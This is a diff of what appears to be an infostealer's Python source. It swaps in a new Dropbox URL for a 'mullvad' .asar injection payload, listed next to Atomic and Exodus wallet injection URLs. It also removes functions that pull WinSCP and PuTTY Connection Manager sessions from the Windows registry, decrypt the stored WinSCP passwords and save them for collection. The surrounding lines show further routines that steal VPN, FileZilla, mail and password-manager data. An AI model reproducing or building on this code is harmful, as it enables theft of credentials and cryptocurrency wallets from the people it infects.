@@ -30,7 +30,7 @@ CHAT_ID = "%CHAT_ID%"
 
 atomic_injection_url = "https://www.dropbox.com/scl/fi/vcgr1flh520p4wc2vahyz/atomic.asar?rlkey=xdrqmiga31nix63bs124gu6ld&st=f9t1keq5&dl=1"
 exodus_injection_url = "https://www.dropbox.com/scl/fi/4sab386qgb99niee4uexg/exodus.asar?rlkey=shj7wwg5ekz5jzcd7vcndd17c&st=rkxs7sgi&dl=1"
-mullvad_injection_url = "https://www.dropbox.com/scl/fi/vqp9enm28lnrx9ds9ckao/mullvad.asar?rlkey=gimdi0ctlx5hb4a6a5uuxvr4f&st=7k6ws8js&dl=1"
+mullvad_injection_url = "https://www.dropbox.com/scl/fi/mkum06wrax2rxurcbky3t/mullvad.asar?rlkey=uiuztnm7ui32zac9vru4couei&st=z6nzewtv&dl=1"
 
 def logs_handler(error_message: str) -> None:
     hostname = platform.node()
@@ -1684,140 +1684,7 @@ class get_data:
         except Exception as Error:
             logs_handler(f"[ERROR] - getting FileZilla files: {str(Error)}")
             pass
-
-    async def StealWinSCP(self, directory_path: str) -> None:
-        try:
-            registry_path = r"SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
-            winscp_session = os.path.join(directory_path, "FTP Clients", 'WinSCP')
-            os.makedirs(winscp_session, exist_ok=True)
-            output_path = os.path.join(winscp_session, 'WinSCP-sessions.txt')
-
-            def decrypt_winscp_password(hostname, username, password):
-                check_flag = 255
-                magic = 163
-                key = hostname + username
-                remaining_pass = password
-                flag_and_pass = decrypt_next_character_winscp(remaining_pass)
-                stored_flag = flag_and_pass['flag']
-                if stored_flag == check_flag:
-                    remaining_pass = remaining_pass[2:]
-                    flag_and_pass = decrypt_next_character_winscp(remaining_pass)
-                length = flag_and_pass['flag']
-                remaining_pass = remaining_pass[(flag_and_pass['flag'] * 2):]
-                final_output = ""
-                for _ in range(length):
-                    flag_and_pass = decrypt_next_character_winscp(remaining_pass)
-                    final_output += chr(flag_and_pass['flag'])
-                if stored_flag == check_flag:
-                    return final_output[len(key):]
-                return final_output
-
-            def decrypt_next_character_winscp(remaining_pass):
-                magic = 163
-                firstval = "0123456789ABCDEF".index(remaining_pass[0]) * 16
-                secondval = "0123456789ABCDEF".index(remaining_pass[1])
-                added = firstval + secondval
-                decrypted_result = ((~(added ^ magic)) + 256) % 256
-                return {'flag': decrypted_result, 'remaining_pass': remaining_pass[2:]}
-
-            output = ""
-            try:
-                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path) as reg_key:
-                    index = 0
-                    while True:
-                        try:
-                            session_name = winreg.EnumKey(reg_key, index)
-                            session_path = f"{registry_path}\\{session_name}"
-                            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, session_path) as session_key:
-                                hostname = winreg.QueryValueEx(session_key, 'HostName')[0]
-                                username = winreg.QueryValueEx(session_key, 'UserName')[0]
-                                encrypted_password = winreg.QueryValueEx(session_key, 'Password')[0]
-                                password = decrypt_winscp_password(hostname, username, encrypted_password)
-                                output += f"Session  : {session_name}\nHostname : {hostname}\nUsername : {username}\nPassword : {password}\n---------------------------------------------------|\n"
-                        except OSError:
-                            break
-                        index += 1
-            except FileNotFoundError:
-                return
-            except Exception as Error:
-                return
             
-            if output:
-                with open(output_path, 'w', encoding="utf-8", errors="ignore") as file:
-                    file.write(output)
-
-                if os.path.getsize(output_path) == 0:
-                    os.remove(output_path)
-                    folder_dirname = os.path.dirname(output_path)
-                    if not os.listdir(folder_dirname):
-                        os.rmdir(folder_dirname)
-
-        except OSError as Error:
-            logs_handler(f"[ERROR] - saving WinSCP files: {str(Error)}")
-        except Exception as Error:
-            logs_handler(f"[ERROR] - getting WinSCP files: {str(Error)}")
-
-    async def StealPutty(self, directory_path: str) -> None:
-        async def parse_xml(xml_file: str) -> list:
-            try:
-                tree = ET.parse(xml_file)
-                root = tree.getroot()
-                pwd_found = []
-
-                for connection in root.findall('connection'):
-                    values = {}
-                    for child in connection:
-                        if child.tag in ['name', 'protocol', 'host', 'port', 'description', 'login', 'password']:
-                            values[child.tag] = child.text
-
-                    if values:
-                        pwd_found.append(values)
-
-                return pwd_found
-            except ET.ParseError as Error:
-                logs_handler(f"[ERROR] - parsing Putty XML: {str(Error)}")
-                return []
-
-        try:
-            access_read = win32con.KEY_READ | win32con.KEY_ENUMERATE_SUB_KEYS | win32con.KEY_QUERY_VALUE
-            key_path = 'Software\\ACS\\PuTTY Connection Manager'
-
-            try:
-                key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, key_path, 0, access_read)
-                this_name, _ = win32api.RegQueryValueEx(key, 'DefaultDatabase')
-            except FileNotFoundError:
-                return
-            except Exception as Error:
-                return
-            
-            full_path = os.path.join(directory_path, "FTP Clients", "Putty", str(this_name) if this_name else ' ')
-            
-            if os.path.exists(full_path):
-                pwd_found = await parse_xml(full_path)
-                output_file = os.path.join(directory_path, "FTP Clients", "Putty", 'putty_connections.txt')
-                try:
-                    with open(output_file, 'w') as file:
-                        for entry in pwd_found:
-                            for key, value in entry.items():
-                                file.write(f"{key}: {value}\n")
-                            file.write("\n")
-                            
-                    if os.path.getsize(output_file) == 0:
-                        os.remove(output_file)
-                        folder_dirname = os.path.dirname(output_file)
-                        if not os.listdir(folder_dirname):
-                            os.rmdir(folder_dirname)
-                            
-                except IOError as Error:
-                    logs_handler(f"[ERROR] - saving Putty files: {str(Error)}")
-            else:
-                pass
-
-        except Exception as Error:
-            logs_handler(f"[ERROR] - An unexpected error occurred: {str(Error)}")
-
-
-
     async def StealPasswordManagers(self, directory_path: str) -> None:
         try:
             password_mgr_dirs = {
@@ -2221,8 +2088,6 @@ class get_data:
                 self.StealOpenVPN(filePath),
                 self.StealSurfsharkVPN(filePath),
                 self.StealFileZilla(filePath),
-                self.StealWinSCP(filePath),
-                self.StealPutty(filePath),
                 self.BackupMailbird(filePath),
                 self.BackupThunderbird(filePath),
                 self.StealPasswordManagers(filePath),
